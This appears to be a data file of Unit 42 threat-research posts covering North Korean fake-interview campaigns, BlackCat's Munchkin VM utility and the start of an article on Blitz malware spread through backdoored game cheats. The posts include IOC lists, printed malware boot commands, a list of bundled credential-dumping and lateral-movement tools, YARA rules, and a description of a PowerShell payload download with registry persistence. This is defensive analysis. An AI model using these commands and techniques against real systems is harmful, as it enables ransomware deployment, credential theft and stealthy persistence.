Wagemole.\nWe track the threat actor behind Contagious Interview as CL-STA-0240, and attribute with moderate confidence that this is also a North Korea state-sponsored threat actor.\nIn light of this analysis, we attribute with a moderate level of confidence that both campaigns trace to North Korea state-sponsored threat actors.\nConclusion Unit 42 researchers investigated suspicious activity from our telemetry and discovered these two campaigns, Contagious Interview and Wagemole, which we track as CL-STA-0240 and CL-STA-0241 respectively.\nIn the process, we discovered two new malware families we have named BeaverTail and InvisibleFerret used in the Contagious Interview campaign.\nSoftware developers are often the weakest link for supply chain attacks, and fraudulent job offers are an ongoing concern, so we expect continued activity from Contagious Interview.\nFurthermore, Wagemole represents an opportunity to embed insiders in targeted companies.\nWe will continue to monitor our telemetry for further activity from these and other campaigns.\nRecommendations and Protections What is an effective strategy against these threats?\nFor Contagious Interview and many other threats, software developers should not use a company-issued computer for personal or non-work related activities like job interviews.\nPersonal activity on a company-issued computer can provide opportunities for threat actors to access a company's network through malware.\nDevelopers should also be suspicious of GitHub accounts containing a single repository with little or no updates.\nThreat actors frequently abuse free services like GitHub to distribute malware.\nAlso, no one should install unknown files from unverified sources on their work or home computers.\nJob applicants should exercise due diligence to confirm the existence and legitimacy of companies offering job interviews, and also confirm that prospective interviewers actually work for the companies they claim to represent.\nIt is also wise to be cautious of downloading and installing unusual types of communications software or of downloading software packages as a prerequisite for obtaining an interview.\nFor Wagemole, employers should thoroughly vet all job applicants.\nFake identities are an increasing concern on job-related social media platforms, and threat actors can easily generate an alias for remote work.\nIf in-person interviews are not an option, use teleconferencing to interview job applicants.\nBe aware of anyone who applies for an on-site job, states they are currently out of the area and then offers immediate availability for remote work.\nFor remote-only roles, employers should be suspicious of anything that seems unusual with any job applicant during the hiring process.\nPalo Alto Networks customers receive protection from malware discussed in this article through products like Cortex XDR and our Next-Generation Firewall with Cloud-Delivered Security Services that include Advanced WildFire, Advanced Threat Prevention and Advanced URL Filtering.\nNext-Generation Firewall with the Advanced Threat Prevention security subscription can help block the malware's C2 traffic with best practices via the following Threat Prevention signatures: 86817, 86818, 86819.\nIf you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise SHA256 hashes for files associated with BeaverTail: - 09a508e99b905330a3ebb7682c0dd5712e8eaa01a154b45a861ca12b6af29f86 - 0ce264819c7af1c485878ce795fd4727952157af7ffdea5f78bfd5b9d7806db1 - 104926c2c937b4597ea3493bccb7683ae812ef3c62c93a8fb008cfd64e05df59 - 1123fea9d3a52989ec34041f791045c216d19db69d71e62aa6b24a22d3278ef9 - 121ca625f582add0527f888bb84b31920183e78c7476228091ff2199ec5d796b - 12c0f44a931b9d0d74a2892565363bedfa13bec8e48ff5cd2352dec968f407ee - 1b21556fc8ecb9f8169ba0482de857b1f8a5cb120b2f1ac7729febe76f1eea83 - 1c905fa3a108f4c9bc0578882ce7af9682760b80af5232f130aa4f6463156b25 - 1f9169492d18bffacebe951a22495d5dec81f35b0929da7783b5f094efef7b48 - 2618a067e976f35f65aee95fecc9a8f52abea2fffd01e001f9865850435694cf - 40645f9052e03fed3a33a7e0f58bc2c263eeae02cbc855b9308511f5dc134797 - 41a912d72ba9d5db95094be333f79b60cae943a2bd113e20cc171f86ebcb86cf - 4c465e6c8f43f7d13a1b887ff26d9a30f77cf65dd3b6f2e9f7fe36c8b6e83003 - 4c605c6ef280b4ed5657fe97ba5b6106b10c4de02a40ae8c8907683129156efd - 592769457001374fac7a44379282ddf28c2219020c88150e32853f7517896c34 - 61dff5cbad45b4fe0852ac95b96b62918742b9c90dd47c672cbe0d1dafccb6c5 - 6465f7ddc9cf8ab6714cbbd49e1fd472e19818a0babbaf3764e96552e179c9af - 6b3fce8f2dad7e803418edd8dfc807b0252705c11ec77114498b01766102e849 - 700a582408cbda7ee79723b3969b8d10d67871ea31bb17c8ca3c0d94b481aa8c - 709820850127201a17caab273e01bb36ce185b4c4f68cd1099110bb193c84c42 - 72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d - 75f9f99295f86de85a8a2e4d73ed569bdb14a56a33d8240c72084f11752b207e - 785f65f1853a08b0e86db5638fbd76e8cad5fe1359655716166a76035261c0be - 7b718a46ae4de09ed4f2513df6e989afe1fbb1a0f59511a4689fac5e1745547d - 7f8bb754f84a06b3e3617dd1138f07a918d11717cc63acaef8eb5c6d10101377 - 845d7978682fa19161281a35b62f4c447c477082a765d6fedb219877d0c90f31 - 9867f99a66e64f6bce0cfca18b124194a683b8e4cb0ced44f7cb09386e1b528d - 9ae24a1912e4b0bab76ae97484b62ea22bdc27b7ea3e6472f18bf04ca66c87de - a2f8de3c5f5f6ecbf29c15afd43a7c13a5bf60023ecb371d39bcca6ceef1d2b7 - b5f151f0a4288e148fd10e19c78399f5b7bdff2ad66940fadd20d6eae4b7518b - b833f40b2f3439f317cf95980b29bddd2245d2acc2d5c11e9690dd2fa4289585 - c8c11f9b308ea5983eebd8a414684021cc4cc1f67e7398ff967a18ae202fb457 - ceb59dbaf58a8de02f9d5e9b497321db0a19b7db4affd5b8d1a7e40d62775f96 - d8f065d264b1112d6ee3cf34979289e89d9dcb30d2a3bd78cc797a81d3d56f56 - db6e75987cabdbfc21d0fdcb1cdae9887c492cab2b2ff1e529601a34a2abfd99 - de42155e14a3c9c4d919316d6ba830229533de5063fcd110f53e2395ef3aa77a - e2a940c7d19409e960427749519dc02293abe58a1bef78404a8390f818e40d08 - fc9bb03998a89524ce5a0f859feb45806983aa4feb5f4d436107198ca869ff6f - ff620bd560485c13a58a0de941bd3e52943036e6a05306e928f7c626998822fb SHA256 hashes for DLL files downloaded by BeaverTail: - da6d9c837c7c2531f0dbb7ce92bfceba4a9979953b6d49ed0862551d4b465adc - 2d8a5b637a95de3b709780898b7c3957f93d72806e87302f50c40fe850471a44 - c5a73896dc628c23a0b6210f50019445e2b8bfc9770f4c81e1fed097f02dfade SHA256 hashes for files associated with InvisibleFerret: - 35434e903bc3be183fa07b9e99d49c0b0b3d8cf6cbd383518e9a9d753d25b672 - 305de20b24e2662d47f06f16a5998ef933a5f8e92f9ecadf82129b484769bbac - 39e7f94684129efce4d070d89e27508709f95fa55d9721f7b5d52f8b66b95ceb - ab198c5a79cd9dedb271bd8a56ab568fbd91984f269f075d8b65173e749a8fde - 444f56157dfcf9fc2347911a00fe9f3e3cb7971dccf67e1359d2f99a35aed88e - 4f50051ae3cb57f10506c6d69d7c9739c90ef21bfb82b14da6f4b407b6febac0 - 276863ee7b250419411b39c8539c31857752e54b53b072dffd0d3669f2914216 - 617c62da1c228ec6d264f89e375e9a594a72a714a9701ed3268aa4742925112b - c547b80e1026d562ac851be007792ae98ddc1f3f8776741a72035aca3f18d277 - 03185038cad7126663550d2290a14a166494fdd7ab0978b98667d64bda6e27cc - 2d300410a3edb77b5f1f0ff2aa2d378425d984f15028c35dfad20fc750a6671a - 92aeea4c32013b935cd8550a082aff1014d0cd2c2b7d861b43a344de83b68129 Domain and IPs associated with the Contagious Interview campaign: - blocktestingto[.]com - 144.172.74[.]48 - 144.172.79[.]23 - 167.88.168[.]152 - 167.88.168[.]24 - 172.86.123[.]35 - 45.61.129[.]255 - 45.61.130[.]0 - 45.61.160[.]14 - 45.61.169[.]187 Updated Dec. 1, 2023, at 2:40 p.m. PT to expand product protections.\nUpdated Aug. 23, 2024, at 12:20 p.m. PT to correct numbering in Attribution section.\nUpdated Aug 28, 2024, at 7:43 a.m. PT to correct number in Table 3.","num_sentences":220,"metadata":{"source":"blog","platform":"Unit42","filename":"Bear-Hallmarks"}}
{"id":71,"title":"BlackCat Climbs the Summit With a New Tactic","publish_date":"2021-11-28","link":"https://unit42.paloaltonetworks.com/blackcat-ransomware-releases-new-utility-munchkin/","clean_text":"Executive Summary BlackCat operators recently announced new updates to their tooling, including a utility called Munchkin that allows attackers to propagate the BlackCat payload to remote machines and shares on a victim organization network.\nFor the past two years, the BlackCat ransomware operators have continued to evolve and iterate their tooling as part of their ransomware-as-a-service (RaaS) business model.\nAs part of a recent investigation, Unit 42 researchers have acquired an instance of Munchkin that is unique, in that it is loaded in a customized Alpine virtual machine (VM).\nThis new tactic of leveraging a customized VM to deploy malware has been gaining traction in recent months, allowing ransomware threat actors to use VMs to circumvent security solutions in deploying their malware payloads.\nThis publication details how this new utility works and sheds further light on the continued tactics used by BlackCat threat actors.\nIn doing so, it is our sincere hope to motivate further effort by the information security industry to better defend against this evolving threat.\nPalo Alto Networks customers receive protections against this specific threat through appropriate identification of the provided indicators as malicious.\n| Related Unit 42 Topics | BlackCat Ransomware | Overview of BlackCat The BlackCat ransomware threat was first made public when it surfaced in November 2021.\nThis threat gained notoriety due to the sophistication employed within their malware, along with unique approaches such as the use of the Rust programming language.\nBlackCat, similar to other ransomware threat actors, employs a RaaS business model.\nThis model allows affiliates to leverage their tooling, in turn providing a portion of the profits to the operators.\nBased on historical reports, affiliates keep roughly 80-90% of the ransom payment, with the remainder being sent to the operators.\nThe BlackCat organization, including its affiliates, has historically focused on targeting victims in the United States.\nHowever, this focus has greatly broadened over time with increased popularity, and BlackCat has more recently been observed targeting victims worldwide across numerous industries and verticals.\nThe BlackCat tool set has continued to evolve over the years.\nOriginal versions provided an embedded JSON configuration with no obfuscation or encryption applied.\nOver time, threat operators updated the malware family to obfuscate this underlying configuration.\nThey also required a unique command-line parameter to execute the malware.\nIn doing so, BlackCat prevented those within the security community from gaining insight into the underlying payloads in the event this command-line parameter was unavailable.\nThe malware family has continued to evolve, with threat operators employing further capabilities and obfuscation mechanisms.\nIn recent months, BlackCat has released a new tool named “Munchkin.”\nThis tooling provided a Linux-based operating system (OS) running Sphynx (the latest BlackCat variant).\nThreat operators can use this utility to run BlackCat on remote machines, or to deploy it to encrypt remote Server Message Block (SMB)/Common Internet File Shares (CIFS).\nThe use of virtual machines to run malware is a growing trend within the ransomware community.\nOther ransomware organizations have been reported to leverage this new tactic as well.\nThe benefits of this approach include circumventing any security controls or protections set on the host OS, such as antivirus software.\nAs these solutions often do not have the introspection within the embedded virtualized OS, malware will frequently bypass any checks that are present.\nAs part of a recent investigation, Unit 42 researchers were able to acquire a copy of this VM utility.\nAs such, we can provide insights into how it works.\nClimbing the Summit The Munchkin utility is delivered as an ISO file, which is loaded in a newly installed instance of the VirtualBox virtualization product.\nThis ISO file represents a customized implementation of the Alpine OS, which threat operators likely chose due to its small footprint.\nUpon running the operating system, the following commands are executed at boot: | 1 2 3 | echo -n \"root:[password]\" | chpasswd tmux new-session -A -s controller \\; send -t controller \"/app/controller && poweroff\" ENTER \\; detach -s controller eject | In doing so, the malware initially changes the root password of the VM to one chosen by the threat actors.\nIt subsequently generates a new terminal session via the built-in tmux utility, which is used to execute the malware binary named controller.\nAfter the malware completes execution, it powers the VM off.\nThe controller malware is hosted within the /app directory, along with other related files.\nIn addition, other related and notable files are included within the VM OS, as noted in Table 1 below.\n| File Path | Description | | /app/controller | Munchkin malware utility.\n| | /app/config | Serialized configuration file used by Munchkin.\n| | /app/payload | Template BlackCat malware sample, which is customized by Munchkin at runtime.\n| | /scripts/smb_common.py | Python helper utility for SMB-related operations.\n| | /scripts/smb_copy_and_exec.py | Python script used to copy a file via SMB and subsequently run it.\n| | /scripts/smb_exec.py | Python script used to execute a remote file.\n| Table 1.\nFile path and description of the files included within the VM OS.\nIn addition to the files noted above, a large number of Python scripts are present within the /usr/bin directly, which the BlackCat operators can use in subsequent updates within the VM. -\nDumpNTLMInfo.py - Get-GPPPassword.py - GetADUsers.py - GetNPUsers.py - GetUserSPNs.py - addcomputer.py - atexec.py - changepasswd.py - dcomexec.py - dpapi.py - esentutl.py - exchanger.py - findDelegation.py - flask - futurize - getArch.py - getPac.py - getST.py - getTGT.py - goldenPac.py - karmaSMB.py - keylistattack.py - kintercept.py - ldapdomaindump - ldd2bloodhound - ldd2pretty - lookupsid.py - machine_role.py - mimikatz.py - mqtt_check.py - mssqlclient.py - mssqlinstance.py - net.py - netview.py - nmapAnswerMachine.py - normalizer - ntfs-read.py - ntlmrelayx.py - pasteurize - ping.py - ping6.py - pip - pip3 - pip3.11 - psexec.py - raiseChild.py - rbcd.py - rdp_check.py - reg.py - registry-read.py - rpcdump.py - rpcmap.py - sambaPipe.py - samrdump.py - secretsdump.py - services.py - smbclient.py - smbexec.py - smbpasswd.py - smbrelayx.py - smbserver.py - sniff.py - sniffer.py - split.py - ticketConverter.py - ticketer.py - tstool.py - wmiexec.py - wmipersist.py - wmiquery.py Attackers can use many of the Python scripts above for lateral movement, password dumping and further execution of malware on the victim network.\nThe controller malware is written in the Rust programming language in a manner very similar to the BlackCat malware family.\nUpon execution, the controller will initially decrypt numerous strings using a unique single-byte XOR operation.\nAfter the strings are decrypted, the threat will perform basic checks to ensure that the expected configuration and payload files reside within the /app directory.\nThe threat will then deserialize and parse the /app/config file.\nIn the event any of these files are not present or if they are unable to be parsed, the malware will exit with an error message.\nThe /app/config file contains a wealth of information including the following, which the controller malware sample subsequently uses: - Access Token - Task identifiers - Victim credentials (including usernames, passwords and domains) - BlackCat victim URLs - Blocklisted file types and paths - Hosts and shares to target for encryption After the configuration is parsed, the controller creates and mounts the /payloads/ directory, which it uses to host subsequently created instances of BlackCat.\nThe controller uses the previously noted /app/payload as a template for creating customized BlackCat samples.\nWithin the template file, there are specific markers that the controller looks for and uses when it modifies this file.\nThe created files are based on the provided configuration.\nHowever, they are named as follows, with incremental values: - /payloads/0 - /payloads/1 After these payloads have been created, the malware proceeds to iterate through the provided configuration with the intent of infecting any SMB/CIFS drives that are specified.\nThese attempts are outlined in various outputs written to STDOUT, an example of which is shown below. (\nNote: The actual IP addresses and share names have been redacted in the output below.)\n| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 | 05:21:40 [INFO] Loading Config 05:21:40 [INFO] Initializing System 05:21:40 [INFO] Initializing Array 05:21:40 [INFO] Pass #1 05:21:40 [INFO] Executing tasks 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] 05:21:40 [INFO] Scanning [ip_address] 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] 05:21:40 [INFO] Scanning [ip_address] 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] 05:21:40 [INFO] Scanning [ip_address] 05:21:40 [INFO] Task [ip_address] [TRUNCATED] 05:21:40 [INFO] Pass #2 05:21:40 [INFO] Executing tasks 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] 05:21:40 [INFO] Scanning [ip_address] 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] 05:21:40 [INFO] Scanning [ip_address] 05:21:40 [INFO] Task [ip_address] 05:21:40 [INFO] Encode Shares [ip_address] -> [share_path] [TRUNCATED] 05:21:40 [INFO] Done!\n| After the malware executes fully, the VM powers off and performs no further actions.\nWe found the following message embedded within the malware sample itself.\nIt is not used; it was presumably included at a certain stage of development but was later removed from use.\n| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 | ATTENTION: At the time there is NO CONFIG ENCRYPTION, meaning chat access token is NOT ENCRYPTED in the ISO.\nLeaking the ISO will result in chat access token leak!\nIt's highly recommended to EJECT and DELETE the ISO right after system boot.\nDO NOT LEAVE THE ISO ON TARGET SYSTEMS!\nUsage: Controller is launched at boot time in tmux session named \"controller\".\nIt will execute all the tasks and exit.\nIf you've set \"shutdown\" option at config time it will also shutdown the machine after finishing tasks.\nIf \"shutdown\" option is not set you can relaunch Controller by running \"/app/controller\".\nMonitoring: Monitor progress by running \"tmux a\" with either terminal or ssh connection.\n| This message appears to be a message from the BlackCat creators to their affiliates urging them to remove this file from a compromised environment.\nIt would seem that the affiliate in question failed to heed this advice.\nConclusion Malware authors, especially those behind the BlackCat ransomware threat, continue to iterate and evolve their techniques and tactics.\nThis is fully apparent in their recent release of Munchkin, which they’ve developed and provided to their affiliates.\nThis tool follows a continued trend of leveraging VMs in an attempt to thwart security controls present on a host and to stay ahead of the security community in defending against these threats.\nPalo Alto Networks customers receive protection from the threats discussed above through the following products: - Next-Generation Firewalls with cloud-delivered security services including WildFire detect the files mentioned within this report as malicious.\nIf you think you might have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise /app/controller - Munchkin Binary - 1a4082c161eafde7e367e0ea2c98543c06dce667b547881455d1984037a90e7d /app/payload - BlackCat Stub - b4dd6e689b80cfcdd74b0995250d63d76ab789f1315af7fe326122540cddfad2 /scripts/smb_common.py - Python SMB Classes - 41c0b2258c632ee122fb52bf2f644c7fb595a5beaec71527e2ebce7183644db2 /scripts/smb_copy_and_exec.py - Python SMB Copy/Exec Script - 2e808fc1b2bd960909385575fa9227928ca25c8665d3ce5ad986b03679dace90 /app/payload - BlackCat Stub - b4dd6e689b80cfcdd74b0995250d63d76ab789f1315af7fe326122540cddfad2 YARA Rules | 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 | rule u42_crime_nix_munchkin { meta: author = \"Unit 42 Threat Intelligence\" date = \"2023-10-12\" description = \"Identifies a scanning utility leveraged by the BlackCat operators that is used to propagate the malware payload to additional hosts via SMB.\"\nhash = \"1a4082c161eafde7e367e0ea2c98543c06dce667b547881455d1984037a90e7d\" reference = \"https://unit42.paloaltonetworks.com/blackcat-ransomware/\" strings: $str0 = \"At the time there is NO CONFIG ENCRYPTION, meaning chat access token is NOT ENCRYPTED in the ISO.\"\nxor(1-255) $str1 = \"Leaking the ISO will result in chat access token leak!\"\nxor(1-255) $str2 = \"It's highly recommended to EJECT and DELETE the ISO right after system boot.\"\nxor(1-255) $str3 = \"DO NOT LEAVE THE ISO ON TARGET SYSTEMS!\"\nxor(1-255) $str4 = \"Controller is launched at boot time in tmux session named \\\"controller\\\".\"\nxor(1-255) $str5 = \"It will execute all the tasks and exit.\"\nxor(1-255) $str6 = \"If you've set \\\"shutdown\\\" option at config time it will also shutdown the machine after finishing tasks.\"\nxor(1-255) $str7 = \"If \\\"shutdown\\\" option is not set you can relaunch Controller by running \\\"/app/controller\" xor(1-255) $str8 = \"Monitor progress by running \\\"tmux a\\\" with either terminal or ssh connection\" xor(1-255) $str9 = \"controller::smb\" xor(1-255) $str10 = \": Failed, either no credentials or no ADMIN$ share found\" xor(1-255) $str11 = \"bin/controller/src/program.rs\" xor(1-255) $str12 = \"/scripts/smb_exec.py\" xor(1-255) $str13 = \"No payload configs provided!\"\nxor(1-255) $str14 = \"Can't deserialize config\" xor(1-255) $str15 = \"controller::program\" xor(1-255) condition: any of them } | | 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 | rule u42_crime_win_blackcat { meta: author = \"Unit 42 Threat Intelligence\" date = \"2023-10-12\" description = \"Identifies the BlackCat ransomware malware family, which is written in the Rust programming language.\"\nhash = \"b4dd6e689b80cfcdd74b0995250d63d76ab789f1315af7fe326122540cddfad2\" reference = \"https://unit42.paloaltonetworks.com/blackcat-ransomware/\" strings: $str0 = \"paths_file\" xor(1-255) $str1 = \"override_credentials\" xor(1-255) $str2 = \"disable_recursion\" xor(1-255) $str3 = \"disable_network\" xor(1-255) $str4 = \"disable_elevate_to_system\" xor(1-255) $str5 = \"disable_self_propagation\" xor(1-255) $str6 = \"self_destruct\" xor(1-255) $str7 = \"The following required argument was not provided: Path to resource to be processed.\"\nxor(1-255) $str8 = \"Resource is one of:\" xor(1-255) $str9 = \"Path to local or remote File\" xor(1-255) $str10 = \"Path to local or remote Directory\" xor(1-255) $str11 = \"Path to remote server, i.e. \\\"\\\\10.0.0.1\\\"\" xor(1-255) $str12 = \"If no paths provided:\" xor(1-255) $str13 = \"A full scan in all available resources will be performed.\"\nxor(1-255) $str14 = \"(you can provide multiple, single or no paths, i.e.: \\\"-p /home -p /opt\\\")\" xor(1-255) $str15 = \"Override config credentials:\\n\\nFormat:\\n\\nusername:password\\n\\n\" xor(1-255) $str16 = \"If Resource is a directory and this option is defined, only direct children of that directory will be processed\" xor(1-255) $str17 = \"disable-recursion\" xor(1-255) $str18 = \"DISABLE_NETWORK\" xor(1-255) $str19 = \"Disable automatic network discovery\" xor(1-255) $str20 = \"disable-network\" xor(1-255) $str21 = \"DISABLE_ELEVATE_TO_SYSTEM\" xor(1-255) $str22 = \"Do not attempt to elevalte access token to system\" xor(1-255) $str23 = \"disable-elevate-to-system\" xor(1-255) $str24 = \"DISABLE_SELF_PROPAGATION\" xor(1-255) $str25 = \"Disable network self propagation\" xor(1-255) $str26 = \"Network propagation is disabled by default in case you provided <\" xor(1-255) $str27 = \"Attach to parent console instead of allocating new one\" xor(1-255) $str28 = \"If no command provided an interactive client will be launched, otherwise client will send provided command and exit.\"\nxor(1-255) condition: 3 of them } | Additional Resources - Threat Assessment: BlackCat Ransomware – Unit 42, Palo Alto Networks - BlackCat (ALPHV) ransomware levels up for stealth, speed and exfiltration – IBM X-Force","num_sentences":94,"metadata":{"source":"blog","platform":"Unit42","filename":"BlackCat"}}
{"id":72,"title":"Blitz Malware: A Tale of Game Cheats and Code Repositories","publish_date":"2025-05-28","link":"https://unit42.paloaltonetworks.com/blitz-malware-2025/","clean_text":"Executive Summary In 2024, we discovered new Windows-based malware called Blitz.\nThis article provides an in-depth analysis of the malware, examines its distribution and reviews Blitz malware's command and control (C2) infrastructure.\nWe found a new version of Blitz in early 2025, which indicates this malware has been in active development.\nThe most recent version of Blitz was spread through backdoored game cheats.\nBlitz malware consists of two stages: a downloader and a bot payload.\nThe developer of Blitz has abused the artificial intelligence (AI) code repository Hugging Face Spaces to host files and components of its C2 infrastructure.\nOur analysis also uncovered a Monero cryptocurrency miner as follow-up malware.\nThe malware developer created a social media presence to promote the distribution of these backdoored game cheats.\nBy early May 2025, the author announced their departure, indicating they might have abandoned Blitz malware.\nHugging Face has locked the user account associated with this malware.\nIt has also taken precautions to block the blob ID of the Blitz bot file to prevent it from being added in the future.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products and services: - Advanced WildFire - Advanced URL Filtering and Advanced DNS Security - Advanced Threat Prevention - Cortex XDR and XSIAM If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n| Related Unit 42 Topics | Cryptocurrency, Cybercrime | What Is Blitz?\nBlitz is Windows-based malware that consists of two stages: - Stage one is the Blitz downloader - Stage two is the Blitz bot The Blitz bot allows an attacker to control an infected Windows host.\nBlitz bot performs information-stealing functions like keylogging and screenshot captures.\nBlitz bot also has a denial-of-service (DoS) function against web servers.\nBlitz has been distributed in two campaigns.\nThe first campaign spread Blitz through software packages pretending to be cracked installers for legitimate programs.\nThe latest version of Blitz from the second campaign was distributed through game cheat packages named Elysium_CrackBy@sw1zzx_dev.zip and Nerest_CrackBy@sw1zzx_dev.zip.\nThese ZIP archives contain backdoored Windows executable (EXE) files.\nFigure 1 shows one of these backdoored game cheats opened on a Windows host.\nRunning the Windows EXE file from the game cheat package retrieves the Blitz downloader behind the scenes.\nThe Blitz downloader retrieves and installs the Blitz bot in the background.\nAn overview of this most recent Blitz infection chain is shown below in Figure 2.\nFor these infections, Blitz malware abuses Hugging Face Spaces, a code repository specializing in AI applications.\nHugging Face's platform for sharing applications is named Spaces.\nBoth the Blitz downloader and the Blitz bot contact a Hugging Face Space during an infection to retrieve malware and receive C2 data.\nThis research article will review the downloader and bot components but let's first look at how these backdoored game cheats are distributed.\nThe person behind Blitz malware appears to be a Russian speaker who uses the moniker sw1zzx on social media platforms.\nThis malware operator is likely the developer of Blitz.\nFor the initial infection vector, sw1zzx has used Telegram to distribute these backdoored game cheats.\nInitial Infection Vector In early 2025, the malware operator sw1zzx began distributing Blitz through backdoored game cheats using a Telegram channel.\nTelegram Channel On Feb. 27, 2025, sw1zzx created a Telegram channel named @sw1zzx_dev to distribute Blitz.\nThe channel was intended to appeal to users of game cheats for the popular mobile multiplayer game Standoff 2, which had over 100 million downloads by April 2025.\nFigure 3 shows the first posts by the malware operator after the Telegram channel’s creation.\nIn this Telegram channel, the malware operator posted updates about the game cheats in Cyrillic characters and advertised them in videos.\nFigure 4 shows a screenshot of the posted cheats that were available for download to both channel subscribers and viewers.\nThe ZIP archives named Nerest_CrackBy@sw1zzx_dev.zip and Elysium_CrackBy@sw1zzx_dev.zip contain the backdoored cheats along with the real cheats.\nThese were linked to an external file-sharing site.\nBoth cheats are for the game Standoff 2.\nThey primarily differ in which real game cheats they use and the publication time in the Telegram channel.\nThe first backdoored cheat Nerest_CrackBy@sw1zzx_dev.zip was published on March 8, 2025, and it was later superseded by the cheat Elysium_CrackBy@sw1zzx_dev.zip on April 11, 2025.\nA third game cheat archive named elysium_android_cracked.zip was directly uploaded to the channel on March 26, 2025, by the malware operator.\nThe following section describes the latest versions of two cheats hosted on the external website.\nBackdoored Game Cheats As the filenames Nerest_CrackBy@sw1zzx_dev.zip and Elysium_CrackBy@sw1zzx_dev.zip indicate, the archives are intended to lure victims into downloading what they believe are just cracked versions of commercial cheats.\nWe have found two other Telegram channels, @nerestpc and @elysiumcheat, that offer these commercial cheats.\nThe cheats are designed to run with the game Standoff 2 on the Windows Android emulator BlueStacks.\nIt is unclear whether the Blitz operator cracked the commercial cheats or obtained them legitimately before backdooring them.\nBackdoored NerestPC Cheat Figure 5 shows the contents of the archive Nerest_CrackBy@sw1zzx_dev.zip.\nThe backdoored cheat Nerest_CrackBy@sw1zzx_dev.exe downloads the malware’s next stage and loads the actual cheat (cheat_bin).\nThe tools directory contains the actual cheat, along with multiple other legitimate files required to run it.\nThe backdoored cheat is a console application that has a compilation timestamp of March 8, 2025, 7:43 p.m. (UTC).\nExecuting the cheat changes the code page of the console windows to UTF-8 with the command chcp 65001 > nul.\nThis prepares for the ASCII characters it writes later to the console screen.\nThe cheat then decrypts various XOR-encrypted API function strings, each with its own 1-byte decryption key.\nIt dynamically resolves these functions and uses them to write the cheat logo to the console window as shown in Figure 6.\nThe backdoored cheat uses an anti-sandbox check before downloading the malware’s next stage.\nFigure 6 shows the fake error ([ERR] Failed with code: 137) that is displayed when the check confirms it's running within a virtual machine (VM).\nThe malware author tries to evade suspicion by using the error message in Figure 6 to pretend that something went wrong during execution rather than immediately quitting the program.\nAfter displaying this error, the backdoored cheat does not retrieve Blitz malware, and the program terminates.\nFigure 7 shows the anti-sandbox check measuring the time required to execute 1,000,000 loop iterations.\nSimultaneously, it also tracks the number of times a secondary thread executes a floating-point instruction (FYL2XP1).\nThe main thread employs the CPUID instruction for busy-waiting and synchronization, while the secondary thread repeatedly executes the floating-point instruction.\nWe believe the program uses this method to detect inconsistencies in execution time, which would indicate an analysis environment like a sandbox or virtual machine.\nBy incrementing the global_count variable shown in Figure 7 with each execution of the floating-point operation, the secondary thread contributes to a final calculation.\nFinally, it evaluates whether the resultant value is greater than 5.0, serving as a threshold for detecting possible sandbox environments.\nTelegram posts from the malware operator shown in Figure 8 state an intent to fix the fake error code 137, apparently due to complaints from its users.\nIf the environment passes the anti-sandbox check, the backdoored game cheat downloads the Blitz downloader.\nFor this, the backdoored game cheat runs the PowerShell one-liner shown in Figure 9 using the Windows system function.\nThe PowerShell code checks for the file ieapfltr.dll in the directory %localappdata%\\Microsoft\\Internet Explorer and compares its SHA256 hash with one it retrieves from pastebin[.]com/raw/FSziK5eW. If the file does not exist or the hashes do not match, it downloads a file from pastebin[.]com/raw/RzLEd17Z that redirects to paste[.]rs/ABNe6 and saves it as ieapfltr.dll.\nFigure 10 shows the URL requests and their returned content.\nAfter downloading and storing the Blitz downloader as %localappdata%\\Microsoft\\Internet Explorer\\ieapfltr.dll, the backdoored cheat creates a logon script entry in the Windows registry for persistence at HKCU\\Environment named UserInitMprLogonScript, as shown in Figure 11.\nThe backdoored cheat does not explicitly start the Blitz downloader.\nInstead, the Blitz downloader initially runs when the victim logs in again after logging out or a reboot.\nThis is a more stealthy approach than directly executing the malware immediately after dropping it.\nFinally, the backdoored cheat shows the cheat’s drop-down menu and then continues to run the actual cheating routines, depending on the option chosen.\nBackdoored Elysium Cheat The other backdoored cheat contained in Elysium_CrackBy@sw1zzx_dev.zip named Elysium_CrackBy@sw1zzx_dev.exe has a compilation timestamp of April 12, 2025, 8:36 a.m. (UTC) and is very similar in functionality to the backdoored NerestPC cheat.\nThe backdoored Elysium cheat is essentially another variant of the backdoor used for the NerestPC cheat with updated functionality, more anti-sandbox checks and code that executes the real Elysium cheat.\nFigure 12 shows the archive’s contents.\nWhen executed, Elysium_CrackBy@sw1zzx_dev.exe opens the malware operator’s Telegram channel t[.]me/sw1zzx_dev with the default web browser.\nAnother difference from the backdoored NerestPC cheat’s behavior is that the Elysium cheat executes more anti-sandbox checks, as shown in the decompiled anti-sandbox routines in Figure 13.\nThese anti-sandbox procedures cause the cheat to terminate if it detects one of the following conditions in its environment: - The number of processors is fewer than four - The screen resolution matches specific low values 